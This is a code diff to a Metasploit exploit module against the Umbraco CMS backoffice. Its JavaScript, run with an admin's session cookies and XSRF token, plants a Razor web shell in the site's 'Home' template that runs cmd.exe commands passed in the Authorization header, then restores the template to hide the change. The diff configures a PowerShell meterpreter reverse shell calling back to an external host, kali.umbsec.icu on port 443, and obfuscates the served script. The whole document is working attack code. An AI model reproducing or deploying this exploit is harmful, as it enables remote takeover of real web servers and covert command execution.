@@ -29,8 +29,11 @@ class MetasploitModule < Msf::Exploit::Remote
             'Arch' => ARCH_CMD,
             'Platform' => 'win',
             'DefaultOptions' => {
-              'PAYLOAD' => 'cmd/windows/generic',
-              'SRVPORT' => 80
+              'PAYLOAD' => 'cmd/windows/powershell/meterpreter/reverse_tcp',
+              'SRVPORT' => 80,
+              'LHOST' => 'kali.umbsec.icu',
+              'LPORT' => 443,
+              'JsObfuscate' => 1
             }
           }]
         ],
@@ -41,9 +44,16 @@ class MetasploitModule < Msf::Exploit::Remote
   #
   #
   #
+  def exploit
+    @js_ofs = js_obfuscate(generate_js)
+    super
+  end
+
+  #
+  #
+  #
   def on_request_uri(cli, _request)
-    js = js_obfuscate(exploit_template)
-    send_response(cli, js, headers = {
+    send_response(cli, @js_ofs, headers = {
       'Content-Type' => 'text/javascript'
     })
   end
@@ -51,107 +61,124 @@ class MetasploitModule < Msf::Exploit::Remote
   #
   #
   #
-  def exploit_template
+  def generate_js
+    cmdBase64 = Base64.strict_encode64(payload.encoded)
+
     %Q~
-
-// Payload configuration
-const cmd = "#{payload.encoded}";
-const umbracoAPI = "/umbraco/backoffice/UmbracoApi";
-const razorTemplateName = "Home";
-const triggerURL = "/";
-const triggerHeaderName = "Authorization";
-
-(async function () {
-  // Get template
-  const allTemplates = await getJSON(`${umbracoAPI}/Template/GetAll`);
-  const templateStub = allTemplates.find((x) =>
-    x.name.includes(razorTemplateName)
-  );
-  const template = await getJSON(`${umbracoAPI}/Template/GetById?id=${templateStub.id}`);
-
-  // Save original template. It will be restored later on
-  const originalTemplate = template.content;
-
-  // Add payload to the end of the template
-  template.content += generatePayloadRazor();
-
-  // Save template
-  const saveTemplate = await postJSON(`${umbracoAPI}/Template/PostSave`, template);
-
-  // Hit URL to trigger command execution
-  const triggerHeaders = {};
-  triggerHeaders[triggerHeaderName] = btoa(cmd);
-  const triggerURLResponse = await fetch(triggerURL, {
-    headers: triggerHeaders,
-  });
-
-  // Reset to original template
-  template.content = originalTemplate;
-  const resetTemplateResponse = await postJSON(`${umbracoAPI}/Template/PostSave`, template);
-
-  /*
-   * Helper Functions
-   */
-
-  function getCookie(name) {
-    const value = `; ${document.cookie}`;
-    const parts = value.split(`; ${name}=`);
-    if (parts.length === 2) return parts.pop().split(';').shift();
-  }
-
-  async function getJSON(url) {
-    var response = await fetch(url, {
-      method: "GET",
-      credentials: "include",
-      headers: {
-        "x-umb-xsrf-token": getCookie("UMB-XSRF-TOKEN"),
-      },
-    });
-    return fromJSON(await response.text());
-  }
-
-  async function postJSON(url, data) {
-    var response = await fetch(url, {
-      method: "POST",
-      body: JSON.stringify(data),
-      credentials: "include",
-      headers: {
-        "x-umb-xsrf-token": getCookie("UMB-XSRF-TOKEN"),
-        "Content-Type": "application/json",
-      },
-    });
-    return fromJSON(await response.text());
-  }
-
-  function fromJSON(responseText) {
-    // Remove XSSI prevention prefix from response body before parsing
-    return JSON.parse(responseText.slice(6));
-  }
-
-  function generatePayloadRazor() {
-    return `
-@if (!string.IsNullOrEmpty(Request.Headers["${triggerHeaderName}"]))
-{
-    try
-    {
-        var cmd = System.Text.Encoding.UTF8.GetString(
-            System.Convert.FromBase64String(Request.Headers["${triggerHeaderName}"]));
-        using (var process = new System.Diagnostics.Process())
-        {
-            process.StartInfo.FileName = "cmd.exe";
-            process.StartInfo.Arguments = "/c " + cmd;
-            process.StartInfo.CreateNoWindow = true;
-            process.StartInfo.RedirectStandardOutput = true;
-            process.StartInfo.UseShellExecute = false;
-            process.Start();
+    // Payload configuration
+    const cmdBase64 = "#{cmdBase64}";
+    const umbracoAPI = "/umbraco/backoffice/UmbracoApi";
+    const razorTemplateName = "Home";
+    const triggerURL = "/";
+    const triggerHeaderName = "Authorization";
+    
+    // Get all templates
+    getJSON(umbracoAPI + "/Template/GetAll").then(function (allTemplates) {
+      // Get template metadata by name
+      const templateMetadata = allTemplates.find(function (template) {
+        return template.name.includes(razorTemplateName);
+      });
+    
+      // Get specific template
+      getJSON(umbracoAPI + "/Template/GetById?id=" + templateMetadata.id).then(
+        function (template) {
+          // Save original template. It will be restored later on
+          const originalTemplate = template.content;
+    
+          // Add payload to the end of the template
+          template.content += generateRazor();
+    
+          // Save template
+          postJSON(umbracoAPI + "/Template/PostSave", template).then(function (
+            savedTemplate
+          ) {
+            // Hit URL to trigger command execution
+            const triggerHeaders = {};
+            triggerHeaders[triggerHeaderName] = cmdBase64;
+            fetch(triggerURL, {
+              headers: triggerHeaders,
+            }).then(function (response) {
+              // Reset to original template
+              template.content = originalTemplate;
+              postJSON(umbracoAPI + "/Template/PostSave", template);
+            });
+          });
         }
+      );
+    });
+    
+    function getCookie(name) {
+      const value = "; " + document.cookie;
+      const parts = value.split("; " + name + "=");
+      if (parts.length === 2) return parts.pop().split(";").shift();
     }
-    catch { }
-}
-`;
-  }
-})();
-
+    
+    function getJSON(url) {
+      return fetch(url, {
+        method: "GET",
+        credentials: "include",
+        headers: {
+          "x-umb-xsrf-token": getCookie("UMB-XSRF-TOKEN"),
+        },
+      })
+        .then(function (response) {
+          return response.text();
+        })
+        .then(function (text) {
+          return fromJSON(text);
+        });
+    }
+    
+    function postJSON(url, data) {
+      return fetch(url, {
+        method: "POST",
+        body: JSON.stringify(data),
+        credentials: "include",
+        headers: {
+          "x-umb-xsrf-token": getCookie("UMB-XSRF-TOKEN"),
+          "Content-Type": "application/json",
+        },
+      })
+        .then(function (response) {
+          return response.text();
+        })
+        .then(function (text) {
+          return fromJSON(text);
+        });
+    }
+    
+    function fromJSON(responseText) {
+      // Remove XSSI prevention prefix from response body before parsing
+      return JSON.parse(responseText.slice(6));
+    }
+    
+    function generateRazor() {
+      return (
+        '\\n@if (!string.IsNullOrEmpty(Request.Headers["' +
+        triggerHeaderName +
+        '"]))' +
+        "{" +
+        "try" +
+        "{" +
+        "var cmd = System.Text.Encoding.UTF8.GetString(" +
+        'System.Convert.FromBase64String(Request.Headers["' +
+        triggerHeaderName +
+        '"]));' +
+        "using (var process = new System.Diagnostics.Process())" +
+        "{" +
+        'process.StartInfo.FileName = "cmd.exe";' +
+        'process.StartInfo.Arguments = "/c " + cmd;' +
+        "process.StartInfo.CreateNoWindow = true;" +
+        "process.StartInfo.RedirectStandardOutput = true;" +
+        "process.StartInfo.UseShellExecute = false;" +
+        "process.Start();" +
+        "}" +
+        "}" +
+        "catch { }" +
+        "}"
+      );
+    }
+        
     ~
   end
 end
